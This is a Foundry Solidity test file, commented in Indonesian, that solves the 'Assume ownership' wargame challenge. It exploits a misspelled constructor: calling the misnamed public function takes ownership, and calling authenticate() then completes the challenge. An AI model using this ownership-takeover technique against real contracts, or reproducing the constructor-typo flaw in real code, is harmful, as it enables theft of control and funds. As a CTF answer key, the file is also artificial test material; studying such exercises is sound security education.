// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// #13 Assume ownership — kontrak 0.4.21 asli. Constructor typo:
// fungsi bernama `AssumeOwmershipChallenge` (huruf 'n' hilang)
// sehingga BUKAN constructor (nama kontrak `AssumeOwnershipChallenge`)
// melainkan fungsi publik biasa yang bisa dipanggil SIAPA PUN untuk
// menjadi owner. Lalu authenticate() -> isComplete = true.
// Sama kelasnya dengan Ethernaut #2 Fallout (constructor typo).
contract AssumeOwnershipSolve is Test {
    address challenge;

    function setUp() public {
        challenge = deployCode("AssumeOwnershipChallenge.sol:AssumeOwnershipChallenge");
    }

    function testInit() public view {
        (bool ok, bytes memory ret) = challenge.staticcall(abi.encodeWithSignature("isComplete()"));
        assertTrue(ok);
        assertFalse(abi.decode(ret, (bool)));
    }

    function testSolve() public {
        (bool ok, ) = challenge.call(abi.encodeWithSignature("AssumeOwmershipChallenge()"));
        assertTrue(ok);
        (bool ok2, ) = challenge.call(abi.encodeWithSignature("authenticate()"));
        assertTrue(ok2);
        (bool ok3, bytes memory ret) = challenge.staticcall(abi.encodeWithSignature("isComplete()"));
        assertTrue(ok3);
        assertTrue(abi.decode(ret, (bool)));
    }
}
